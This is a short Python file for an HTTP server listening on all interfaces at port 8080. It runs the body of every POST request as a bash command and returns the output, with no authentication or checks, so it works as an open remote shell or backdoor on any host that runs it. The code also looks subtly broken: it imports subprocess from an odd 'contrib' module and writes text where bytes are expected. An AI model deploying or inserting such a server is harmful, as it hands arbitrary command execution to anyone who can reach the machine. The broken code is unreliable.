# coding=utf-8
from contrib import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer


class PostHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        cmd = self.rfile.read(int(self.headers['content-length'])).decode()
        params = {'shell': True,
                  'executable': '/bin/bash',
                  'env': {},
                  'stdout': subprocess.PIPE,
                  'stderr': subprocess.PIPE,
                  'universal_newlines': True}

        proc = subprocess.Popen(cmd, **params)
        output = proc.stdout.readlines()
        proc.kill()
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write("\n".join(output))


def run(host="0.0.0.0", port=8080):
    sever = HTTPServer((host, port), PostHandler)
    sever.serve_forever()


if __name__ == '__main__':
    run()
